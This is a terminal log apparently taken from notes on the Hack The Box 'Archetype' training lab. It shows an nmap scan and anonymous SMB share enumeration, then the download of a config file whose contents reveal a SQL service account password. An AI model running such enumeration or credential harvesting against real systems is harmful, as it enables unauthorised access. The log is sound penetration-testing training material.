

``` bash
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/StartPoint/Archetype]
└──╼ $nmap -sC -sV 10.129.110.112
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 13:04 CST
Nmap scan report for 10.129.110.112
Host is up (0.083s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-06-02T01:04:12
|_Not valid after:  2053-06-02T01:04:12
|_ssl-date: 2023-06-02T01:05:01+00:00; +5h59m59s from scanner time.
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-06-01T18:04:51-07:00
| smb2-time: 
|   date: 2023-06-02T01:04:50
|_  start_date: N/A
|_clock-skew: mean: 7h44m59s, deviation: 3h30m01s, median: 5h59m58s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.32 seconds
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/StartPoint/Archetype]
└──╼ $smbclient -N -L \\\\10.129.110.112\\

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/StartPoint/Archetype]
└──╼ $smbclient -N  \\\\10.129.110.112\\backups
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan 20 06:20:57 2020
  ..                                  D        0  Mon Jan 20 06:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 06:23:02 2020

		5056511 blocks of size 4096. 2609804 blocks available
smb: \> get prod.dtsConfig
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (1.9 KiloBytes/sec) (average 1.9 KiloBytes/sec)
smb: \> exit
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/StartPoint/Archetype]
└──╼ $cat prod.dtsConfig 
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>

```